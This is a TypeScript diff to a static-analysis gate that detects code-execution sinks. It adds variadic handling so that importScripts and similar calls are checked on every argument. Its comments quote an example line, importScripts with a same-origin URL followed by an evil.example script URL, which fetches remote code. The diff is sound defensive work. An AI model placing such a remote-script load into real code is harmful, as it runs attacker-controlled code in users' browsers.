@@ -620,6 +620,17 @@ export interface SinkSpec {
    * while `setTimeout('code', 0)` does not.
    */
   readonly codeArgument?: (arg: readonly Token[]) => boolean;
+  /**
+   * The sink takes an UNBOUNDED list of code arguments, so `codeArgument` is
+   * tested against EVERY one of them and any match fires.
+   *
+   * `importScripts` is the case: it loads each URL it is given, so
+   * `importScripts('/local.js', 'https://evil.example/x.js')` fetches remote
+   * code even though its first argument is same-origin. Judging only the first
+   * argument was a REGRESSION against the whole-call text scan this module
+   * replaced — the one thing the structural rewrite was not allowed to lose.
+   */
+  readonly variadic?: boolean;
 }
 
 /**
@@ -687,6 +698,33 @@ export interface SinkFinding {
   readonly line: number;
   /** Source text of the invocation, for the gate's message. */
   readonly text: string;
+}
+
+/**
+ * The argument runs a sink's code predicate must be tested against.
+ *
+ * `position` says where the code starts and whether it arrives inside an array
+ * (the `.apply` / `Reflect.apply` form). A VARIADIC sink is tested against
+ * every argument from that point on — `importScripts` loads each URL it is
+ * handed, so judging only the first would clear
+ * `importScripts('/local.js', 'https://evil.example/x.js')`.
+ */
+function codeArguments(
+  args: readonly Token[][],
+  position: { index: number; inArray: boolean },
+  variadic: boolean,
+): Token[][] {
+  if (position.inArray) {
+    const array = args[position.index] ?? [];
+    if (!isPunct(array[0], '[')) return [];
+    // `['code', …]` — the elements are split out the same way a call's
+    // arguments are, so later elements and the closing bracket never remain
+    // attached to the one being judged.
+    const elements = callArguments(array, 0);
+    return variadic ? elements : [elements[0] ?? []];
+  }
+  const rest = args.slice(position.index);
+  return variadic ? rest : [rest[0] ?? []];
 }
 
 /**
@@ -1060,16 +1098,12 @@ function analyse(
           record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
           return;
         }
-        const args = callArguments(tokens, j);
-        let arg = args[position.index] ?? [];
-        if (position.inArray) {
-          // `.apply(thisArg, ['code', …])` — the code is the array's FIRST
-          // ELEMENT, split out the same way a call's arguments are. Taking the
-          // whole tail instead left the later elements and the closing `]`
-          // attached, which no expression-level predicate can read.
-          arg = isPunct(arg[0], '[') ? (callArguments(arg, 0)[0] ?? []) : [];
-        }
-        if (spec.codeArgument(arg))
+        const candidates = codeArguments(
+          callArguments(tokens, j),
+          position,
+          spec.variadic === true,
+        );
+        if (candidates.some((candidate) => spec.codeArgument?.(candidate) === true))
           record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
         return;
       }
@@ -1115,12 +1149,16 @@ function analyse(
           if (inner) {
             const isConstruct = member.name === 'construct';
             // apply(fn, thisArg, [args]) → args are the 3rd; construct(fn, [args]) → 2nd.
-            const argsArray = args[isConstruct ? 1 : 2] ?? [];
-            const codeArg = isPunct(argsArray[0], '[')
-              ? (callArguments(argsArray, 0)[0] ?? [])
-              : [];
+            const candidates = codeArguments(
+              args,
+              { index: isConstruct ? 1 : 2, inArray: true },
+              inner.variadic === true,
+            );
             const end = matchGroup(tokens, k);
-            if (inner.codeArgument === undefined || inner.codeArgument(codeArg)) {
+            if (
+              inner.codeArgument === undefined ||
+              candidates.some((candidate) => inner.codeArgument?.(candidate) === true)
+            ) {
               record(inner, t, end === -1 ? k + 1 : end);
             }
           }
